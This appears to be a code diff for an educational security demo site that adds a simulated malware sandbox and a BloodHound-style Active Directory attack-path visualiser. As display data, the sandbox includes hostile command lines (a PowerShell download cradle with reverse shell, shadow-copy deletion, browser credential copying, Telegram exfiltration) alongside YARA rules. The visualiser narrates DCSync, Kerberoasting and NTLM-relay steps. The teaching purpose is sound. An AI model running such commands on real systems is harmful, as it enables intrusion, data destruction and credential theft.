@@ -2695,6 +2695,8 @@ document.addEventListener('DOMContentLoaded', () => {
             return Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
         }
         
+        const countries = ["[US]", "[CN]", "[RU]", "[BR]", "[IR]", "[KP]", "[DE]", "[IN]", "[FR]", "[UA]", "[GB]", "[KR]"];
+
         function spawnAttack() {
             // Random point on the edge of the screen
             let startX, startY;
@@ -2709,6 +2711,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const type = attackTypes[Math.floor(Math.random() * attackTypes.length)];
             const target = targets[Math.floor(Math.random() * targets.length)];
             const ip = randomIP();
+            const country = countries[Math.floor(Math.random() * countries.length)];
 
             attacks.push({
                 startX: startX, startY: startY,
@@ -2718,7 +2721,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 progress: 0
             });
             
-            addLog(ip, type, target);
+            addLog(ip, type, target, country);
             
             totalAttacks++;
             document.getElementById('stat-attacks').innerText = totalAttacks;
@@ -2731,7 +2734,7 @@ document.addEventListener('DOMContentLoaded', () => {
             setTimeout(spawnAttack, Math.random() * 1700 + 300);
         }
 
-        function addLog(ip, type, target) {
+        function addLog(ip, type, target, country) {
             const logsBody = document.getElementById('logs-body');
             const now = new Date();
             const time = now.getHours().toString().padStart(2, '0') + ":" + now.getMinutes().toString().padStart(2, '0') + ":" + now.getSeconds().toString().padStart(2, '0');
@@ -2742,7 +2745,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const log = document.createElement('div');
             log.className = `log-entry severity-${type.severity}`;
             log.innerHTML = `
-                <div><span class="log-time">[${time}]</span> <span class="log-ip">${ip}</span></div>
+                <div><span class="log-time">[${time}]</span> <span style="color:#aaa; font-weight:bold; margin-right:5px;">${country}</span> <span class="log-ip">${ip}</span></div>
                 <div class="log-type">${type.name}</div>
                 <div class="log-target">Target: ${target} - <strong style="color:${type.color}">BLOCKED</strong></div>
             `;
@@ -2758,6 +2761,608 @@ document.addEventListener('DOMContentLoaded', () => {
         // Start simulation
         animate();
         setTimeout(spawnAttack, 1000);
+    }
+
+    // ==========================================
+    // 9. SANDBOX-X (tool-sandbox.php)
+    // ==========================================
+    const btnDetonate = document.getElementById('btn-detonate');
+    if (btnDetonate) {
+        const sampleSelector = document.getElementById('sample-selector');
+        const statusBox = document.getElementById('status-box');
+        const dashboard = document.getElementById('analysis-dashboard');
+        const processTree = document.getElementById('process-tree');
+        const netLogs = document.getElementById('net-logs');
+        const reportSection = document.getElementById('report-section');
+        const mitreContainer = document.getElementById('mitre-container');
+        const yaraContainer = document.getElementById('yara-container');
+
+        const malwareData = {
+            macro: {
+                processes: [
+                    { id: "proc1", time: 500, html: `<span class="proc-name">explorer.exe</span> <span class="proc-pid">(PID: 2844)</span>` },
+                    { id: "proc2", time: 1500, html: `<span class="proc-name">WINWORD.EXE</span> <span class="proc-pid">(PID: 5120)</span> <span style="color:#aaa; font-size:0.75rem;">- "URGENTE_FACTURA_03.docx"</span>`, parent: "proc1" },
+                    { id: "proc3", time: 3000, html: `<span class="proc-name proc-bad">cmd.exe</span> <span class="proc-pid">(PID: 7712)</span><div class="proc-cmd">cmd.exe /c powershell -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...</div>`, parent: "proc2" },
+                    { id: "proc4", time: 4500, html: `<span class="proc-name proc-bad">powershell.exe</span> <span class="proc-pid">(PID: 8890)</span>`, parent: "proc3" }
+                ],
+                network: [
+                    { time: 3500, class: "net-dns", text: "DNS Request: bad-domain.ru (Status: NXDOMAIN)" },
+                    { time: 4800, class: "net-dns", text: "DNS Request: update-windows-api.com (Status: NOERROR)" },
+                    { time: 5200, class: "net-http", text: "HTTP GET: http://update-windows-api.com/payload.dll (Status: 200 OK)" },
+                    { time: 5500, class: "net-tcp", text: "TCP Connection Established -> 185.11.22.33:443" }
+                ],
+                mitre: ["T1204 - User Execution", "T1059 - Command and Scripting Interpreter", "T1105 - Ingress Tool Transfer", "T1071 - Application Layer Protocol"],
+                yara: `rule Malicious_Word_Macro_Dropper {\n    meta:\n        author = "Sandbox-X Auto-Generator"\n        description = "Detects obfuscated PowerShell launched from Office apps"\n    strings:\n        $p1 = "powershell -w hidden -enc" ascii wide nocase\n        $p2 = "Convert]::FromBase64String" ascii wide nocase\n        $magic = { D0 CF 11 E0 A1 B1 1A E1 } // OLE file format\n    condition:\n        $magic at 0 and all of ($p*)\n}`
+            },
+            ransom: {
+                processes: [
+                    { id: "proc1", time: 500, html: `<span class="proc-name">explorer.exe</span> <span class="proc-pid">(PID: 1024)</span>` },
+                    { id: "proc2", time: 1500, html: `<span class="proc-name proc-bad">Windows_Update_BETA.exe</span> <span class="proc-pid">(PID: 4420)</span>`, parent: "proc1" },
+                    { id: "proc3", time: 2500, html: `<span class="proc-name proc-bad">vssadmin.exe</span> <span class="proc-pid">(PID: 4435)</span><div class="proc-cmd">vssadmin.exe Delete Shadows /All /Quiet</div>`, parent: "proc2" },
+                    { id: "proc4", time: 4000, html: `<span class="proc-name proc-bad">icacls.exe</span> <span class="proc-pid">(PID: 4501)</span><div class="proc-cmd">icacls "C:\\\\Users\\\\Public" /grant Everyone:F /T /C /Q</div>`, parent: "proc2" }
+                ],
+                network: [
+                    { time: 2000, class: "net-dns", text: "DNS Request: api.ipify.org (Status: NOERROR)" },
+                    { time: 2200, class: "net-http", text: "HTTP GET: http://api.ipify.org/ (IP Discovery)" },
+                    { time: 4500, class: "net-tcp", text: "TCP Callback -> 45.33.22.11:8080 (Key Exchange)" },
+                    { time: 5000, class: "net-tcp", text: "TCP Keep-Alive -> 45.33.22.11:8080" }
+                ],
+                mitre: ["T1486 - Data Encrypted for Impact", "T1490 - Inhibit System Recovery", "T1082 - System Information Discovery", "T1222 - File and Directory Permissions Modification"],
+                yara: `rule CryptoLocker_Style_Ransomware {\n    meta:\n        author = "Sandbox-X Auto-Generator"\n        description = "Detects Ransomware attempting to delete volume shadow copies"\n    strings:\n        $cmd1 = "vssadmin.exe Delete Shadows /All /Quiet" ascii wide nocase\n        $cmd2 = "icacls" ascii wide nocase\n        $mz = { 4D 5A }\n    condition:\n        $mz at 0 and any of ($cmd*)\n}`
+            },
+            powershell: {
+                processes: [
+                    { id: "proc1", time: 500, html: `<span class="proc-name">wscript.exe</span> <span class="proc-pid">(PID: 3012)</span> <span style="color:#aaa; font-size:0.75rem;">- "SystemDiagnostics.vbs"</span>` },
+                    { id: "proc2", time: 2000, html: `<span class="proc-name proc-bad">powershell.exe</span> <span class="proc-pid">(PID: 6632)</span><div class="proc-cmd">powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/beacon.ps1')"</div>`, parent: "proc1" }
+                ],
+                network: [
+                    { time: 2500, class: "net-http", text: "HTTP GET: http://10.10.14.5/beacon.ps1 (Status: 200 OK)" },
+                    { time: 3500, class: "net-tcp", text: "TCP Connection -> 10.10.14.5:4444 (Reverse Shell Session Initiated)" },
+                    { time: 4500, class: "net-tcp", text: "TCP Payload Transfer (14.2 KB)" }
+                ],
+                mitre: ["T1059.005 - Visual Basic", "T1059.001 - PowerShell", "T1105 - Ingress Tool Transfer", "T1071.001 - Web Protocols (Beaconing)"],
+                yara: `rule VBS_Dropping_PowerShell_Beacon {\n    meta:\n        author = "Sandbox-X Auto-Generator"\n        description = "Detects VBS scripts executing PowerShell download cradles"\n    strings:\n        $ps1 = "powershell" ascii wide nocase\n        $ps2 = "IEX" ascii wide nocase\n        $ps3 = "Net.WebClient" ascii wide nocase\n        $ps4 = "DownloadString" ascii wide nocase\n    condition:\n        all of ($ps*)\n}`
+            },
+            wannacry: {
+                processes: [
+                    { id: "proc1", time: 500, html: `<span class="proc-name">explorer.exe</span> <span class="proc-pid">(PID: 1024)</span>` },
+                    { id: "proc2", time: 1500, html: `<span class="proc-name proc-bad">WanaDecryptor.exe</span> <span class="proc-pid">(PID: 4420)</span>`, parent: "proc1" },
+                    { id: "proc3", time: 2500, html: `<span class="proc-name proc-bad">mssecsvc.exe</span> <span class="proc-pid">(PID: 4435)</span><div class="proc-cmd">C:\\\\Windows\\\\tasksche.exe</div>`, parent: "proc2" },
+                    { id: "proc4", time: 4000, html: `<span class="proc-name proc-bad">tasksche.exe</span> <span class="proc-pid">(PID: 4501)</span>`, parent: "proc3" }
+                ],
+                network: [
+                    { time: 2000, class: "net-dns", text: "DNS Request: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com (Status: NXDOMAIN)" },
+                    { time: 3000, class: "net-tcp", text: "TCP Scan -> 192.168.1.15:445 (SMB Port)" },
+                    { time: 3500, class: "net-tcp", text: "TCP Scan -> 192.168.1.16:445 (SMB Port)" },
+                    { time: 4500, class: "net-tcp", text: "TCP Connection -> 192.168.1.16:445 (MS17-010 Exploit Success)" }
+                ],
+                mitre: ["T1210 - Exploitation of Remote Services", "T1046 - Network Service Discovery", "T1486 - Data Encrypted for Impact", "T1090 - Proxy"],
+                yara: `rule WannaCry_Worm {\n    meta:\n        author = "Sandbox-X Auto-Generator"\n        description = "Detects WannaCry MS17-010 payload"\n    strings:\n        $s1 = "mssecsvc.exe" ascii wide\n        $s2 = "tasksche.exe" ascii wide\n        $s3 = "WNcry@2ol7" ascii wide\n    condition:\n        all of ($s*)\n}`
+            },
+            stealer: {
+                processes: [
+                    { id: "proc1", time: 500, html: `<span class="proc-name">explorer.exe</span> <span class="proc-pid">(PID: 1024)</span>` },
+                    { id: "proc2", time: 1500, html: `<span class="proc-name proc-bad">Discord_Nitro_Free.exe</span> <span class="proc-pid">(PID: 8820)</span>`, parent: "proc1" },
+                    { id: "proc3", time: 2500, html: `<span class="proc-name proc-bad">cmd.exe</span> <span class="proc-pid">(PID: 8835)</span><div class="proc-cmd">copy "%LocalAppData%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data" "%Temp%\\\\logins.db"</div>`, parent: "proc2" }
+                ],
+                network: [
+                    { time: 2000, class: "net-dns", text: "DNS Request: api.telegram.org (Status: NOERROR)" },
+                    { time: 3500, class: "net-tcp", text: "TCP Connection -> 149.154.167.220:443" },
+                    { time: 4000, class: "net-http", text: "HTTP POST: https://api.telegram.org/bot12345/sendDocument (Data Exfiltration)" }
+                ],
+                mitre: ["T1555.003 - Credentials from Web Browsers", "T1048 - Exfiltration Over Alternative Protocol", "T1059.003 - Windows Command Shell"],
+                yara: `rule RedLine_Style_InfoStealer {\n    meta:\n        author = "Sandbox-X Auto-Generator"\n        description = "Detects InfoStealers targeting browser databases"\n    strings:\n        $path1 = "Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data" ascii wide nocase\n        $path2 = "api.telegram.org" ascii wide nocase\n    condition:\n        any of ($path*)\n}`
+            },
+            miner: {
+                processes: [
+                    { id: "proc1", time: 500, html: `<span class="proc-name">explorer.exe</span> <span class="proc-pid">(PID: 1024)</span>` },
+                    { id: "proc2", time: 1500, html: `<span class="proc-name proc-bad">Adobe_Flash_Setup.exe</span> <span class="proc-pid">(PID: 5520)</span>`, parent: "proc1" },
+                    { id: "proc3", time: 3000, html: `<span class="proc-name proc-bad">svchost.exe</span> <span class="proc-pid">(PID: 5590)</span><div class="proc-cmd">svchost.exe (Process Hollowing - Injected Thread)</div>`, parent: "proc2" }
+                ],
+                network: [
+                    { time: 2000, class: "net-dns", text: "DNS Request: pool.supportxmr.com (Status: NOERROR)" },
+                    { time: 3500, class: "net-tcp", text: "TCP Connection -> 198.100.149.51:3333 (Stratum Protocol)" },
+                    { time: 4500, class: "net-tcp", text: 'TCP Payload: {"method":"login","params":{"login":"44AFFq5k..."}}' }
+                ],
+                mitre: ["T1055.012 - Process Hollowing", "T1496 - Resource Hijacking", "T1071.001 - Web Protocols"],
+                yara: `rule Cryptominer_XMRig_Injected {\n    meta:\n        author = "Sandbox-X Auto-Generator"\n        description = "Detects XMRig Stratum protocol in injected processes"\n    strings:\n        $s1 = "pool.supportxmr.com" ascii wide nocase\n        $s2 = "{\\"method\\":\\"login\\",\\"params\\":{\\"login\\":" ascii wide nocase\n    condition:\n        any of ($s*)\n}`
+            }
+        };
+
+        btnDetonate.addEventListener('click', () => {
+            const sampleKey = sampleSelector.value;
+            const data = malwareData[sampleKey];
+            
+            btnDetonate.disabled = true;
+            sampleSelector.disabled = true;
+            dashboard.style.display = 'grid';
+            reportSection.style.display = 'none';
+            
+            processTree.innerHTML = '';
+            netLogs.innerHTML = '';
+            
+            const analyzingText = lang === 'es' ? '[ ANALIZANDO PAYLOAD EN ENTORNO AISLADO... ]' : '[ ANALYZING PAYLOAD IN ISOLATED ENVIRONMENT... ]';
+            statusBox.innerHTML = `<span class="status-pulse" style="color:#ff2a2a;">${analyzingText}</span>`;
+            statusBox.style.color = "#ff2a2a";
+
+            let maxTime = 0;
+
+            // Animate Processes
+            data.processes.forEach(proc => {
+                if (proc.time > maxTime) maxTime = proc.time;
+                setTimeout(() => {
+                    const el = document.createElement('div');
+                    el.className = 'process-node';
+                    el.id = proc.id;
+                    el.innerHTML = proc.html;
+                    
+                    if (proc.parent) {
+                        const parentEl = document.getElementById(proc.parent);
+                        if (parentEl) parentEl.appendChild(el);
+                        else processTree.appendChild(el);
+                    } else {
+                        processTree.appendChild(el);
+                    }
+                    
+                    // Trigger reflow for animation
+                    void el.offsetWidth;
+                    el.classList.add('visible');
+                }, proc.time);
+            });
+
+            // Animate Network
+            data.network.forEach(net => {
+                if (net.time > maxTime) maxTime = net.time;
+                setTimeout(() => {
+                    const el = document.createElement('div');
+                    el.className = `net-line ${net.class}`;
+                    el.innerText = `[+${(net.time/1000).toFixed(1)}s] ${net.text}`;
+                    netLogs.appendChild(el);
+                    netLogs.scrollTop = netLogs.scrollHeight;
+                }, net.time);
+            });
+
+            // Finish Analysis
+            setTimeout(() => {
+                const completeText = lang === 'es' ? '[ ANÁLISIS COMPLETADO ]' : '[ ANALYSIS COMPLETE ]';
+                statusBox.innerHTML = completeText;
+                statusBox.style.color = "#00ff41";
+                statusBox.classList.remove('status-pulse');
+                
+                // Build Report
+                mitreContainer.innerHTML = '';
+                data.mitre.forEach(tag => {
+                    mitreContainer.innerHTML += `<span class="mitre-tag">${tag}</span>`;
+                });
+                yaraContainer.innerText = data.yara;
+                
+                reportSection.style.display = 'block';
+                
+                btnDetonate.innerText = lang === 'es' ? 'Analizar Nueva Muestra' : 'Analyze New Sample';
+                btnDetonate.disabled = false;
+                sampleSelector.disabled = false;
+                
+                btnDetonate.onclick = () => location.reload();
+
+            }, maxTime + 1500);
+        });
+    }
+
+    // ==========================================
+    // 10. BLOODHOUND SIMULATOR (tool-bloodhound.php)
+    // ==========================================
+    const bhCanvas = document.getElementById('bh-canvas');
+    if (bhCanvas) {
+        const ctx = bhCanvas.getContext('2d');
+        const tooltip = document.getElementById('bh-tooltip');
+        const btnAttackPath = document.getElementById('btn-attack-path');
+        const btnReset = document.getElementById('btn-reset-graph');
+        
+        let width, height;
+        function resizeBH() {
+            const rect = bhCanvas.parentElement.getBoundingClientRect();
+            width = rect.width;
+            height = rect.height;
+            bhCanvas.width = width;
+            bhCanvas.height = height;
+        }
+        window.addEventListener('resize', resizeBH);
+        resizeBH();
+
+        // Data Definition (Scenarios)
+        const scenarios = {
+            "gpo": {
+                nodes: [
+                    { id: "DOMAIN", type: "domain", label: "CYBERESCUDO.LOCAL", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "DA_GROUP", type: "group", label: "Domain Admins", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "DC_OU", type: "ou", label: "Domain Controllers OU", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "DEF_DC_POLICY", type: "gpo", label: "Default DC Policy", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "USER_BOB", type: "user", label: "Bob (Helpdesk)", x: 0, y: 0, vx: 0, vy: 0, compromised: true },
+                    { id: "IT_GROUP", type: "group", label: "IT Helpdesk", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "COMP_DC01", type: "computer", label: "DC-01.cyberescudo.local", x: 0, y: 0, vx: 0, vy: 0 }
+                ],
+                edges: [
+                    { source: "DA_GROUP", target: "DOMAIN", type: "GenericAll" },
+                    { source: "COMP_DC01", target: "DC_OU", type: "Contains" },
+                    { source: "DEF_DC_POLICY", target: "DC_OU", type: "GPLink" },
+                    { source: "USER_BOB", target: "IT_GROUP", type: "MemberOf" },
+                    { source: "IT_GROUP", target: "DEF_DC_POLICY", type: "GenericWrite" },
+                    { source: "COMP_DC01", target: "DOMAIN", type: "MemberOf" }
+                ],
+                attackPath: {
+                    nodes: ["USER_BOB", "IT_GROUP", "DEF_DC_POLICY", "DC_OU", "COMP_DC01", "DOMAIN"],
+                    edges: [
+                        { source: "USER_BOB", target: "IT_GROUP" },
+                        { source: "IT_GROUP", target: "DEF_DC_POLICY" },
+                        { source: "DEF_DC_POLICY", target: "DC_OU" },
+                        { source: "COMP_DC01", target: "DC_OU" },
+                        { source: "COMP_DC01", target: "DOMAIN" }
+                    ],
+                    steps: [
+                        { title: "1. Compromise User", edge: "Initial Access", text: "El atacante compromete la cuenta de Bob mediante un ataque de Phishing o Password Spraying." },
+                        { title: "2. Group Membership", edge: "MemberOf", text: "Bob hereda privilegios por ser miembro del grupo 'IT Helpdesk'." },
+                        { title: "3. GPO Abuse", edge: "GenericWrite", text: "El grupo IT Helpdesk tiene permisos 'GenericWrite' mal configurados sobre la 'Default DC Policy'." },
+                        { title: "4. GPO Execution", edge: "GPLink", text: "El atacante inyecta una Tarea Programada (Scheduled Task) maliciosa dentro de la GPO." },
+                        { title: "5. Domain Compromise", edge: "Execution", text: "La GPO se despliega en todos los Controladores de Dominio (DC-01), otorgando privilegios de SYSTEM al atacante." }
+                    ]
+                }
+            },
+            "dcsync": {
+                nodes: [
+                    { id: "DOMAIN", type: "domain", label: "CYBERESCUDO.LOCAL", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "DA_GROUP", type: "group", label: "Domain Admins", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "USER_ALICE", type: "user", label: "Alice (DA)", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "USER_SVC", type: "user", label: "svc_sql (Service)", x: 0, y: 0, vx: 0, vy: 0, compromised: true },
+                    { id: "COMP_SRV01", type: "computer", label: "SQL-SRV.cyberescudo.local", x: 0, y: 0, vx: 0, vy: 0 }
+                ],
+                edges: [
+                    { source: "DA_GROUP", target: "DOMAIN", type: "GenericAll" },
+                    { source: "USER_ALICE", target: "DA_GROUP", type: "MemberOf" },
+                    { source: "USER_SVC", target: "DOMAIN", type: "GetChangesAll" },
+                    { source: "USER_SVC", target: "COMP_SRV01", type: "AdminTo" }
+                ],
+                attackPath: {
+                    nodes: ["USER_SVC", "DOMAIN", "USER_ALICE"],
+                    edges: [
+                        { source: "USER_SVC", target: "DOMAIN" },
+                        { source: "DOMAIN", target: "USER_ALICE" }
+                    ],
+                    steps: [
+                        { title: "1. Initial Compromise", edge: "Kerberoasting", text: "El atacante solicita el ticket TGS de svc_sql y lo crackea offline extrayendo su contraseña (Kerberoasting)." },
+                        { title: "2. DCSync Attack", edge: "GetChangesAll", text: "La cuenta de servicio tiene el privilegio de replicación GetChangesAll. Se usa Mimikatz (DCSync) para simular ser un Controlador de Dominio." },
+                        { title: "3. Dump Credentials", edge: "Dump", text: "El atacante solicita la replicación del hash NTLM de Alice (Domain Admin) sin ejecutar código en el servidor, comprometiendo todo el entorno." }
+                    ]
+                }
+            },
+            "adcs": {
+                nodes: [
+                    { id: "DOMAIN", type: "domain", label: "CYBERESCUDO.LOCAL", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "USER_EVE", type: "user", label: "Eve (Unprivileged)", x: 0, y: 0, vx: 0, vy: 0, compromised: true },
+                    { id: "COMP_DC01", type: "computer", label: "DC-01.cyberescudo.local", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "COMP_PKI", type: "computer", label: "PKI-SRV.cyberescudo.local", x: 0, y: 0, vx: 0, vy: 0 },
+                    { id: "CERT_TEMP", type: "cert", label: "WebServer Template", x: 0, y: 0, vx: 0, vy: 0 }
+                ],
+                edges: [
+                    { source: "COMP_DC01", target: "DOMAIN", type: "GenericAll" },
+                    { source: "COMP_PKI", target: "CERT_TEMP", type: "Hosts" },
+                    { source: "USER_EVE", target: "COMP_DC01", type: "CoerceAuth" },
+                    { source: "COMP_DC01", target: "COMP_PKI", type: "NTLMRelay" }
+                ],
+                attackPath: {
+                    nodes: ["USER_EVE", "COMP_DC01", "COMP_PKI", "DOMAIN"],
+                    edges: [
+                        { source: "USER_EVE", target: "COMP_DC01" },
+                        { source: "COMP_DC01", target: "COMP_PKI" }
+                    ],
+                    steps: [
+                        { title: "1. Coerce Authentication", edge: "PetitPotam", text: "Eve fuerza a DC-01 a autenticarse contra la máquina del atacante explotando RPC/MS-EFSR (PetitPotam)." },
+                        { title: "2. NTLM Relay (ESC8)", edge: "NTLMRelay", text: "Se captura la petición de autenticación NTLM del DC-01 y se redirige (Relay) hacia el endpoint HTTP del servidor AD CS (PKI-SRV)." },
+                        { title: "3. Certificate Request", edge: "Enroll", text: "El atacante solicita un certificado de autenticación de cliente en nombre de DC-01." },
+                        { title: "4. Domain Takeover", edge: "PassTheCert", text: "Con el certificado emitido para DC-01$, se solicita un TGT kerberos (Rubeus) obteniendo acceso absoluto al dominio." }
+                    ]
+                }
+            }
+        };
+
+        let currentNodes = [];
+        let currentEdges = [];
+        let attackPath = [];
+        let highlightedNodes = new Set();
+        const explPanel = document.getElementById('attack-explanation');
+
+        function loadScenario(scenarioKey) {
+            const data = scenarios[scenarioKey];
+            currentNodes = JSON.parse(JSON.stringify(data.nodes));
+            currentEdges = JSON.parse(JSON.stringify(data.edges));
+            attackPath = [];
+            highlightedNodes.clear();
+            explPanel.style.display = 'none';
+            explPanel.innerHTML = '';
+
+            document.getElementById('stat-u').innerText = currentNodes.filter(n => n.type === 'user').length;
+            document.getElementById('stat-c').innerText = currentNodes.filter(n => n.type === 'computer').length;
+            document.getElementById('stat-g').innerText = currentNodes.filter(n => n.type === 'group').length;
+            document.getElementById('stat-d').innerText = currentNodes.filter(n => n.type === 'domain').length;
+
+            currentNodes.forEach(n => {
+                n.x = width/2 + (Math.random() - 0.5) * 200;
+                n.y = height/2 + (Math.random() - 0.5) * 200;
+                n.vx = 0; n.vy = 0;
+            });
+        }
+
+        const selector = document.getElementById('bh-scenario');
+        selector.addEventListener('change', (e) => {
+            loadScenario(e.target.value);
+        });
+        
+        loadScenario('gpo');
+
+        const colors = {
+            user: "#00ff41",
+            computer: "#0088ff",
+            group: "#f0a000",
+            ou: "#b400ff",
+            gpo: "#b400ff",
+            cert: "#b400ff",
+            domain: "#ff2a2a"
+        };
+        const iconMap = { user: "U", computer: "C", group: "G", domain: "D", ou: "OU", gpo: "GPO", cert: "CRT" };
+
+        const K_REPULSION = 8000;
+        const K_SPRING = 0.05;
+        const SPRING_LENGTH = 150;
+        const DAMPING = 0.7;
+
+        let isDragging = false;
+        let dragNode = null;
+        let mouseX = 0, mouseY = 0;
+
+        function physicsTick() {
+            for(let i=0; i<currentNodes.length; i++) {
+                for(let j=i+1; j<currentNodes.length; j++) {
+                    const dx = currentNodes[i].x - currentNodes[j].x;
+                    const dy = currentNodes[i].y - currentNodes[j].y;
+                    const distSq = dx*dx + dy*dy || 1;
+                    const force = K_REPULSION / distSq;
+                    const dist = Math.sqrt(distSq);
+                    const fx = (dx/dist) * force;
+                    const fy = (dy/dist) * force;
+                    currentNodes[i].vx += fx;
+                    currentNodes[i].vy += fy;
+                    currentNodes[j].vx -= fx;
+                    currentNodes[j].vy -= fy;
+                }
+            }
+
+            currentEdges.forEach(e => {
+                const s = currentNodes.find(n => n.id === e.source);
+                const t = currentNodes.find(n => n.id === e.target);
+                if(!s || !t) return;
+                const dx = t.x - s.x;
+                const dy = t.y - s.y;
+                const dist = Math.sqrt(dx*dx + dy*dy) || 1;
+                const force = (dist - SPRING_LENGTH) * K_SPRING;
+                const fx = (dx/dist) * force;
+                const fy = (dy/dist) * force;
+                s.vx += fx;
+                s.vy += fy;
+                t.vx -= fx;
+                t.vy -= fy;
+            });
+
+            currentNodes.forEach(n => {
+                n.vx += (width/2 - n.x) * 0.01;
+                n.vy += (height/2 - n.y) * 0.01;
+            });
+
+            currentNodes.forEach(n => {
+                if(isDragging && dragNode === n) {
+                    n.x = mouseX;
+                    n.y = mouseY;
+                    n.vx = 0; n.vy = 0;
+                } else {
+                    n.vx *= DAMPING;
+                    n.vy *= DAMPING;
+                    n.x += n.vx;
+                    n.y += n.vy;
+                }
+                n.x = Math.max(20, Math.min(width-20, n.x));
+                n.y = Math.max(20, Math.min(height-20, n.y));
+            });
+        }
+
+        function drawEdge(s, t, label, isPath) {
+            ctx.beginPath();
+            ctx.moveTo(s.x, s.y);
+            ctx.lineTo(t.x, t.y);
+            ctx.strokeStyle = isPath ? "#00ffff" : "#444";
+            if (isPath) ctx.setLineDash([5, 5]);
+            else ctx.setLineDash([]);
+            ctx.lineWidth = isPath ? 2 : 1;
+            ctx.stroke();
+            ctx.setLineDash([]);
+
+            const dx = t.x - s.x;
+            const dy = t.y - s.y;
+            const angle = Math.atan2(dy, dx);
+            const dist = Math.sqrt(dx*dx + dy*dy);
+            
+            if (dist > 50) {
+                const mx = s.x + dx/2;
+                const my = s.y + dy/2;
+                ctx.fillStyle = isPath ? "#00ffff" : "#888";
+                ctx.font = "10px monospace";
+                ctx.textAlign = "center";
+                ctx.textBaseline = "bottom";
+                ctx.fillText(label, mx, my - 5);
+            }
+
+            const headlen = 10;
+            const targetRadius = 15;
+            const endX = t.x - targetRadius * Math.cos(angle);
+            const endY = t.y - targetRadius * Math.sin(angle);
+            
+            ctx.beginPath();
+            ctx.moveTo(endX, endY);
+            ctx.lineTo(endX - headlen * Math.cos(angle - Math.PI / 6), endY - headlen * Math.sin(angle - Math.PI / 6));
+            ctx.lineTo(endX - headlen * Math.cos(angle + Math.PI / 6), endY - headlen * Math.sin(angle + Math.PI / 6));
+            ctx.fillStyle = isPath ? "#00ffff" : "#444";
+            ctx.fill();
+        }
+
+        let hoverNode = null;
+
+        function renderTick() {
+            ctx.clearRect(0, 0, width, height);
+            
+            currentEdges.forEach(e => {
+                const s = currentNodes.find(n => n.id === e.source);
+                const t = currentNodes.find(n => n.id === e.target);
+                if(!s || !t) return;
+                const isPathEdge = attackPath.find(ap => (ap.source === e.source && ap.target === e.target) || (ap.source === e.target && ap.target === e.source));
+                drawEdge(s, t, e.type, !!isPathEdge);
+            });
+
+            currentNodes.forEach(n => {
+                const isHover = (hoverNode === n);
+                const isHighlighted = highlightedNodes.has(n.id);
+                
+                ctx.beginPath();
+                ctx.arc(n.x, n.y, isHover ? 20 : 15, 0, Math.PI*2);
+                ctx.fillStyle = isHighlighted ? "#ff2a2a" : colors[n.type];
+                if (n.compromised && !isHighlighted) {
+                    const pulse = 15 + Math.sin(Date.now() / 200) * 5;
+                    ctx.fillStyle = "#00ff41";
+                    ctx.shadowColor = "#00ff41";
+                    ctx.shadowBlur = 20;
+                    ctx.arc(n.x, n.y, pulse, 0, Math.PI*2);
+                    ctx.fill();
+                    ctx.shadowBlur = 0;
+                }
+                ctx.fill();
+                
+                ctx.strokeStyle = "#000";
+                ctx.lineWidth = 2;
+                ctx.stroke();
+
+                ctx.fillStyle = (isHighlighted || isHover) ? "#fff" : "#ccc";
+                ctx.font = "12px monospace";
+                ctx.textAlign = "center";
+                ctx.textBaseline = "top";
+                ctx.fillText(n.label, n.x, n.y + 22);
+                
+                ctx.fillStyle = "#000";
+                ctx.textBaseline = "middle";
+                ctx.font = "10px Arial";
+                ctx.fillText(iconMap[n.type], n.x, n.y);
+            });
+        }
+
+        function loop() {
+            physicsTick();
+            renderTick();
+            requestAnimationFrame(loop);
+        }
+        loop();
+
+        bhCanvas.addEventListener('mousemove', (e) => {
+            const rect = bhCanvas.getBoundingClientRect();
+            mouseX = e.clientX - rect.left;
+            mouseY = e.clientY - rect.top;
+            
+            let found = null;
+            for(let i=currentNodes.length-1; i>=0; i--) {
+                const n = currentNodes[i];
+                const dx = mouseX - n.x;
+                const dy = mouseY - n.y;
+                if(dx*dx + dy*dy < 400) {
+                    found = n;
+                    break;
+                }
+            }
+            
+            if (found !== hoverNode) {
+                hoverNode = found;
+                if(hoverNode) {
+                    bhCanvas.style.cursor = 'pointer';
+                    tooltip.style.display = 'block';
+                    tooltip.innerHTML = `<strong>${hoverNode.label}</strong><br>Type: ${hoverNode.type.toUpperCase()}<br>ID: ${hoverNode.id}`;
+                } else {
+                    bhCanvas.style.cursor = 'grab';
+                    tooltip.style.display = 'none';
+                }
+            }
+            
+            if(hoverNode) {
+                tooltip.style.left = (mouseX + 15) + 'px';
+                tooltip.style.top = (mouseY + 15) + 'px';
+            }
+            
+            if(isDragging && dragNode) {
+                dragNode.x = mouseX;
+                dragNode.y = mouseY;
+            }
+        });
+
+        bhCanvas.addEventListener('mousedown', () => {
+            if(hoverNode) {
+                isDragging = true;
+                dragNode = hoverNode;
+                bhCanvas.style.cursor = 'grabbing';
+            }
+        });
+
+        window.addEventListener('mouseup', () => {
+            isDragging = false;
+            dragNode = null;
+            if(!hoverNode) bhCanvas.style.cursor = 'grab';
+            else bhCanvas.style.cursor = 'pointer';
+        });
+
+        btnAttackPath.addEventListener('click', () => {
